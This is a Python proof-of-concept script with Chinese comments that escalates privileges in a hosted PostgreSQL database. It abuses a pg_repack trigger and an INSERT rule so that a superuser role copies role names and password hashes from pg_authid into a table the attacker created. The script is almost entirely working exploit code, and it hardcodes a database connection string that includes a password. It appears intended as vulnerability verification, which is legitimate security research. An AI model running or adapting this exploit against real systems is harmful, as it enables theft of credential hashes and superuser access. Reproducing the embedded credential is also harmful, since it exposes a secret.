# -*- coding: utf-8 -*-
"""RULE 纯 DML 提权读验证:cloud_admin SPI INSERT log_<oid> 触发规则重写,
动作以 cloud_admin(superuser)身份 SELECT pg_authid -> 自建表 k_exfil。
零破坏:pg_authid 只读;k_exfil 自建且脚本结束删除;展示脱敏(不打印哈希内容)。"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:280]

# 0) 基线:用户直读 pg_authid
print('[0] direct read pg_authid:', q("SELECT count(*) FROM pg_authid"))

# 1) 扩展 + 自建源表
print('create ext:', q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False))
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)
print('[1] setup ok, oid:', oid)

# 2) 自建 exfil 表 + RULE:动作以执行者身份做权限检查
q("DROP TABLE IF EXISTS k_exfil", fetch=False)
q("CREATE TABLE k_exfil(rolname text, pw text)", fetch=False)
q("DROP RULE IF EXISTS r4 ON repack.log_%d" % oid, fetch=False)
cr = q("CREATE RULE r4 AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_exfil SELECT rolname, rolpassword FROM pg_authid" % oid, fetch=False)
print('[2] create rule:', cr)

# 3) 触发:用户 INSERT k_src -> cloud_admin SPI INSERT log_oid -> 规则以 cloud_admin 执行
print('[3] trigger insert:', q("INSERT INTO k_src VALUES (1,'x')", fetch=False))
rows = q("SELECT rolname, length(pw) FROM k_exfil ORDER BY 1")
print('[3] exfil rows (name, pw_len):', rows)

# 4) 清理(依赖序)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP RULE IF EXISTS r4 ON repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_exfil", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[4] cleanup:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
